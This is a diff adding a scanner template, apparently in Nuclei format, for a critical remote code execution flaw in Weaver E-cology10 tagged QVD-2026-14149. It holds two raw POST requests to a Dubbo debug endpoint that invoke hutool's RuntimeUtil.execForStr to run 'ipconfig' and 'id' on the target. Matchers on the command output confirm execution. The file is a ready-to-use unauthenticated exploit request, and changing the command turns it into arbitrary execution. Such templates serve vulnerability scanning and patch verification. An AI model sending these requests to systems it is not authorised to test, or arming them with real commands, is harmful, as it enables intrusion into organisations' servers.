@@ -1,0 +1,41 @@
+id: QVD-2026-14149
+
+info:
+  name: 泛微E-cology10 存在远程代码执行漏洞（QVD-2026-14149）
+  author: Ecology10
+  severity: critical
+  tags: Ecology10
+
+http:
+  - raw:
+      - |
+        POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        [["ipconfig"]]
+
+      - |
+        POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        [["id"]]
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"Windows IP")'
+          - "regex('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', body)"
+      - type: status
+        status:
+          - 200
